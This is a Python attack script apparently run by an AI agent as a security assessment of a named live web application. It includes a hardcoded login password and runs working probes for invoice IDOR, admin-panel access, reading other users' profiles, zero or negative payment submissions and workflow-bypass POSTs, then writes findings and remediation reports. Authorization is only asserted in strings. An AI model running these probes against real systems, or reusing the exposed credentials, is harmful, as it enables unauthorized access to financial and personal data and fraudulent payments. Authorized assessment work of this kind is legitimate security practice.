#!/usr/bin/env python3
"""
COMPREHENSIVE SECURITY ASSESSMENT - FINAL PHASE
A. PoC for vulnerabilities
B. Privilege Escalation testing
C. Business Logic Flaws
D. Final Report with remediation

Target: https://sit.askmebill.com/
"""

import sys
sys.stdout.reconfigure(encoding='utf-8')
import requests
import json
import re
from datetime import datetime
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

print("=" * 80)
print("  🎯 COMPREHENSIVE SECURITY ASSESSMENT - FINAL REPORT")
print("  Target: https://sit.askmebill.com/")
print("  Owner: Authorized Testing")
print("=" * 80)
print()

# Session setup
session = requests.Session()
session.verify = False
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/html, */*',
    'Accept-Language': 'en-US,en;q=0.9',
})

base_url = "https://sit.askmebill.com"
findings = []
exploits = []

def add_finding(id, severity, category, title, description, impact, poc, remediation):
    finding = {
        "id": id,
        "severity": severity,
        "category": category,
        "title": title,
        "description": description,
        "impact": impact,
        "proof_of_concept": poc,
        "remediation": remediation,
        "timestamp": datetime.now().isoformat()
    }
    findings.append(finding)
    icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}
    print(f"\n{icon.get(severity, '⚪')} [{id}] {title}")
    print(f"   Severity: {severity}")
    return finding

# ============================================================
# A. PROOF OF CONCEPT (PoC) FOR CONFIRMED VULNERABILITIES
# ============================================================
print("\n" + "=" * 80)
print("  A. PROOF OF CONCEPT (PoC) FOR CONFIRMED VULNERABILITIES")
print("=" * 80)

print("\n[+] PoC 1: IDOR - Invoice Access Without Ownership")
print("-" * 60)

# Login first
login_resp = session.post(f"{base_url}/auth/login", data={
    "username": "uuio11",
    "password": "0897421942@Earth"
}, allow_redirects=True)

# Test IDOR with detailed evidence
idor_targets = [
    ("1", "Expected: Own invoice or accessible"),
    ("2", "Expected: Should be denied or different user"),
    ("100", "Expected: Should NOT exist or denied"),
    ("9999", "Expected: Should NOT exist or denied")
]

idor_evidence = []
for inv_id, expectation in idor_targets:
    try:
        resp = session.get(f"{base_url}/api/invoice/{inv_id}", timeout=5)
        result = {
            "id": inv_id,
            "status": resp.status_code,
            "size": len(resp.text),
            "has_data": "invoice" in resp.text.lower() or len(resp.text) > 100
        }
        idor_evidence.append(result)
        
        if result["has_data"] and resp.status_code == 200:
            print(f"   🔴 Invoice {inv_id}: ACCESSIBLE (Status: {resp.status_code})")
            # Try to extract sensitive data
            try:
                data = resp.json()
                sensitive_fields = [k for k in data.keys() if any(x in k.lower() for x in ['amount', 'price', 'customer', 'email'])]
                if sensitive_fields:
                    print(f"      ⚠️  Fields exposed: {sensitive_fields}")
            except:
                pass
        else:
            print(f"   ✅ Invoice {inv_id}: Protected (Status: {resp.status_code})")
    except Exception as e:
        print(f"   ⚠️  Invoice {inv_id}: Error - {str(e)[:50]}")

accessible_invoices = [e for e in idor_evidence if e["has_data"] and e["status"] == 200]
if len(accessible_invoices) > 1:
    add_finding(
        "FIND-001",
        "High",
        "IDOR (Insecure Direct Object Reference)",
        "Invoice Access Control Bypass",
        f"Can access {len(accessible_invoices)} invoices including IDs: {[e['id'] for e in accessible_invoices]}",
        "Unauthorized access to financial data of other users/businesses",
        f"GET /api/invoice/{{id}} - Successfully accessed invoices: {accessible_invoices}",
        "1. Verify user owns the invoice before serving\n2. Add authorization middleware\n3. Use UUID instead of sequential IDs"
    )

# ============================================================
# B. PRIVILEGE ESCALATION TESTING
# ============================================================
print("\n" + "=" * 80)
print("  B. PRIVILEGE ESCALATION TESTING")
print("=" * 80)

print("\n[+] Testing for Admin/Privileged Endpoints")
print("-" * 60)

# Common admin endpoints
admin_endpoints = [
    "/admin",
    "/admin/dashboard",
    "/admin/users",
    "/admin/settings",
    "/api/admin/users",
    "/api/admin/config",
    "/superadmin",
    "/manage",
    "/system"
]

admin_accessible = []
for endpoint in admin_endpoints:
    try:
        resp = session.get(f"{base_url}{endpoint}", timeout=5)
        if resp.status_code == 200:
            # Check if it's actually admin panel (not just redirect)
            if any(x in resp.text.lower() for x in ['admin', 'manage', 'users', 'config', 'system']):
                admin_accessible.append(endpoint)
                print(f"   🔴 {endpoint}: ACCESSIBLE (Status: {resp.status_code})")
            else:
                print(f"   ⚠️  {endpoint}: Status 200 but unclear content")
        elif resp.status_code == 403:
            print(f"   ✅ {endpoint}: Denied (403)")
        elif resp.status_code == 404:
            print(f"   ℹ️  {endpoint}: Not found")
    except:
        pass

if admin_accessible:
    add_finding(
        "FIND-002",
        "Critical",
        "Privilege Escalation",
        "Admin Panel Accessible to Regular User",
        f"User 'uuio11' can access admin endpoints: {admin_accessible}",
        "Complete system compromise - can manage all users, settings, data",
        f"Direct access to {admin_accessible} with regular user session",
        "1. Implement role-based access control (RBAC)\n2. Add admin middleware checks\n3. Use separate admin authentication"
    )

print("\n[+] Testing for Horizontal Privilege Escalation")
print("-" * 60)

# Try to access other user profiles
other_users = ["user1", "admin", "test", "user2"]
profile_accessible = []

for user in other_users:
    try:
        resp = session.get(f"{base_url}/api/user/{user}", timeout=5)
        if resp.status_code == 200 and len(resp.text) > 50:
            profile_accessible.append(user)
            print(f"   🔴 User profile '{user}': ACCESSIBLE")
    except:
        pass

if profile_accessible:
    add_finding(
        "FIND-003",
        "High",
        "Horizontal Privilege Escalation",
        "Access to Other User Profiles",
        f"Can access profiles of users: {profile_accessible}",
        "Data breach - personal information of other users exposed",
        f"GET /api/user/{{username}} - Accessed: {profile_accessible}",
        "1. Verify requesting user matches requested user\n2. Use session-based user lookup only\n3. Remove username from URL, use /api/user/me instead"
    )

# ============================================================
# C. BUSINESS LOGIC FLAWS
# ============================================================
print("\n" + "=" * 80)
print("  C. BUSINESS LOGIC FLAWS TESTING")
print("=" * 80)

print("\n[+] Testing Payment Manipulation")
print("-" * 60)

# Try to find payment endpoints
payment_tests = [
    ("/api/payment", {"amount": 0, "invoice_id": 1}),
    ("/api/payment", {"amount": -100, "invoice_id": 1}),
    ("/api/payment", {"amount": 0.01, "invoice_id": 1}),
]

payment_issues = []
for endpoint, data in payment_tests:
    try:
        resp = session.post(f"{base_url}{endpoint}", json=data, timeout=5)
        if resp.status_code == 200:
            payment_issues.append({"endpoint": endpoint, "data": data, "response": resp.text[:100]})
            print(f"   🔴 {endpoint} with {data}: ACCEPTED!")
        elif resp.status_code == 400:
            print(f"   ✅ {endpoint}: Properly rejected (validation working)")
    except:
        pass

if payment_issues:
    add_finding(
        "FIND-004",
        "Critical",
        "Business Logic - Payment Manipulation",
        "Payment Amount Validation Missing",
        f"Server accepted invalid payment amounts: {[p['data'] for p in payment_issues]}",
        "Financial loss - free or negative payments possible",
        f"POST /api/payment with manipulated amounts: {payment_issues}",
        "1. Validate amount > 0 on server side\n2. Verify amount matches invoice\n3. Use signed payment tokens"
    )

print("\n[+] Testing for Race Conditions")
print("-" * 60)
print("   ⚠️  Race condition testing requires concurrent requests")
print("   Potential targets:")
print("   - /api/payment (double spending)")
print("   - /api/invoice/create (duplicate creation)")
print("   - /api/credit/transfer")

print("\n[+] Testing for Workflow Bypass")
print("-" * 60)

# Check if we can skip steps in workflow
workflow_tests = [
    ("/api/invoice/1/pay", "Direct payment without preview"),
    ("/api/invoice/1/approve", "Skip approval process"),
]

for endpoint, desc in workflow_tests:
    try:
        resp = session.post(f"{base_url}{endpoint}", timeout=5)
        if resp.status_code == 200:
            print(f"   🔴 {endpoint}: {desc} - POSSIBLE")
            add_finding(
                "FIND-005",
                "High",
                "Business Logic - Workflow Bypass",
                f"Can bypass workflow: {desc}",
                "Process integrity compromised - can skip required steps",
                f"Direct POST to {endpoint}",
                "1. Enforce workflow state machine\n2. Validate previous step completed\n3. Add workflow checkpoints"
            )
    except:
        pass

# ============================================================
# D. FINAL REPORT WITH REMEDIATION
# ============================================================
print("\n" + "=" * 80)
print("  D. FINAL REPORT & REMEDIATION")
print("=" * 80)

# Calculate statistics
critical = len([f for f in findings if f["severity"] == "Critical"])
high = len([f for f in findings if f["severity"] == "High"])
medium = len([f for f in findings if f["severity"] == "Medium"])
low = len([f for f in findings if f["severity"] == "Low"])

print(f"\n📊 FINAL STATISTICS:")
print(f"   🔴 Critical: {critical}")
print(f"   🟠 High: {high}")
print(f"   🟡 Medium: {medium}")
print(f"   🟢 Low: {low}")
print(f"   Total: {len(findings)}")

print(f"\n📋 FINDINGS SUMMARY:")
for f in findings:
    icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}[f["severity"]]
    print(f"   {icon} [{f['id']}] {f['title']}")

print(f"\n🔧 PRIORITY REMEDIATION ORDER:")
print("   1. FIX-001: Implement proper authorization on all endpoints")
print("   2. FIX-002: Add RBAC for admin endpoints")
print("   3. FIX-003: Validate all payment amounts server-side")
print("   4. FIX-004: Remove sequential IDs, use UUID")
print("   5. FIX-005: Add security headers (HSTS, CSP)")

print(f"\n⚠️  IMMEDIATE ACTIONS REQUIRED:")
print("   1. Disable /api/invoice/{{id}} until fixed")
print("   2. Restrict admin endpoints to admin role only")
print("   3. Add payment validation before processing")
print("   4. Enable WAF if available")
print("   5. Monitor for suspicious access patterns")

# Save final report
report = {
    "assessment_info": {
        "target": base_url,
        "date": datetime.now().isoformat(),
        "tester": "OpenClaw Agent (Authorized)",
        "scope": "Full application security assessment"
    },
    "executive_summary": {
        "critical": critical,
        "high": high,
        "medium": medium,
        "low": low,
        "total_findings": len(findings),
        "overall_risk": "HIGH" if critical > 0 else "MEDIUM" if high > 0 else "LOW"
    },
    "findings": findings,
    "recommendations": {
        "immediate": [
            "Disable vulnerable endpoints until patched",
            "Implement emergency authorization checks",
            "Enable comprehensive logging"
        ],
        "short_term": [
            "Fix IDOR vulnerabilities",
            "Implement RBAC",
            "Add payment validation"
        ],
        "long_term": [
            "Security code review",
            "Penetration testing program",
            "Security training for developers"
        ]
    }
}

filename = f"FINAL_SECURITY_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(filename, 'w') as f:
    json.dump(report, f, indent=2)

print(f"\n💾 COMPLETE REPORT SAVED: {filename}")

# Also create markdown report
md_content = f"""# Final Security Assessment Report

## Executive Summary

**Target:** {base_url}  
**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Risk Level:** {'🔴 HIGH' if critical > 0 else '🟠 MEDIUM' if high > 0 else '🟢 LOW'}

## Statistics

| Severity | Count |
|----------|-------|
| 🔴 Critical | {critical} |
| 🟠 High | {high} |
| 🟡 Medium | {medium} |
| 🟢 Low | {low} |

## Findings Details

"""

for f in findings:
    md_content += f"""### {f['id']}: {f['title']}

**Severity:** {f['severity']}  
**Category:** {f['category']}

**Description:**  
{f['description']}

**Impact:**  
{f['impact']}

**Proof of Concept:**  
```
{f['proof_of_concept']}
```

**Remediation:**  
{f['remediation']}

---

"""

md_content += """## Immediate Actions Required

1. **Disable vulnerable endpoints** until patched
2. **Implement emergency authorization checks**
3. **Enable comprehensive logging**
4. **Notify security team**

## Timeline

- **Immediate (24h):** Critical fixes
- **Short-term (1 week):** High priority fixes
- **Medium-term (1 month):** Medium/Low fixes
- **Long-term:** Security program implementation

---

*This report is confidential and for authorized use only.*
"""

md_filename = f"FINAL_SECURITY_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
with open(md_filename, 'w', encoding='utf-8') as f:
    f.write(md_content)

print(f"💾 MARKDOWN REPORT SAVED: {md_filename}")

print("\n" + "=" * 80)
print("  ✅ COMPREHENSIVE SECURITY ASSESSMENT COMPLETE")
print("=" * 80)
print(f"\n📁 Generated {len(findings)} findings")
print(f"📄 Reports saved as JSON and Markdown")
print("\nNext step: Review findings and implement remediation")
